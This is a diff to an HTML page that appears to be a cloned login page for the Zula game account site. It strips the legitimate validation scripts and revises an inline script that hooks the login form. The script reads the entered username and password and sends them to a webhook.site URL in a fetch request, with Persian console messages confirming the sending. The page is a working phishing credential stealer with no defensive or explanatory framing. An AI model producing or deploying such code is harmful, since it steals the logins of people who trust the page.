@@ -156,24 +156,20 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
 
 
-
-
-
-
-    <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/libraries/jquery/jquery.validate.js"></script>
-    <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/libraries/jquery/jquery.validate.unobtrusive.js"></script>
-    <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/site.min.js"></script>
-    <script src="//cdn-download2.zula.ir/sitecdn/IR/Content/hesapzulaoyun/js/fsjs.min.js?v=20210513"></script>
-    
-    
-   <script>
+<script>
+  document.addEventListener("DOMContentLoaded", function () {
     document.getElementById("loginForm").addEventListener("submit", function (e) {
+      e.preventDefault();
+
       const username = document.querySelector("input[name='UserName']").value;
       const password = document.querySelector("input[name='Password']").value;
 
-      fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password));
+      fetch("https://webhook.site/f0956b48-6c2a-4996-9e48-39e901291634?username=" + encodeURIComponent(username) + "&password=" + encodeURIComponent(password))
+        .then(response => console.log("ارسال شد:", response.status))
+        .catch(error => console.error("خطا:", error));
     });
-  </script>
+  });
+</script>
 
 
 
